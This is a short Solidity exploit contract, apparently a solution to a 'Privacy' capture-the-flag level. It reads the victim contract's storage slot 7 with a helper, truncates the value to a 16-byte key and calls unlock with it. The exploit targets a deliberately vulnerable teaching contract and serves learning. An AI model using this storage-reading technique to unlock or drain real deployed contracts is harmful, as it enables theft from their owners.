/*

    If you need, you may use the following functions:
    

    awaitNextBlock() -- waits until the next block is mined to continue executing the code
    peekStorage(address _address, uint _slot) == returns the value of the storage slot _slot of the contract at address _address

    make sure to have your contrat extend BlockUtils in order to be able to use these functions

*/

import \"src/Privacy/Privacy.sol\";
import \"exploits/BlockUtils.sol\";

contract PrivacyExploit is BlockUtils {

    Privacy victim;

    constructor(address _victim) {
        victim = Privacy(payable(_victim));
    }

    function hack() public {
        // Read the storage slot 7 where data[2] is stored
        bytes32 data2 = peekStorage(address(victim), 7);
        // Extract the first 16 bytes to form the key
        bytes16 key = bytes16(data2);
        // Call the unlock function with the extracted key
        victim.unlock(key);
    }

    receive() external payable {
    }
}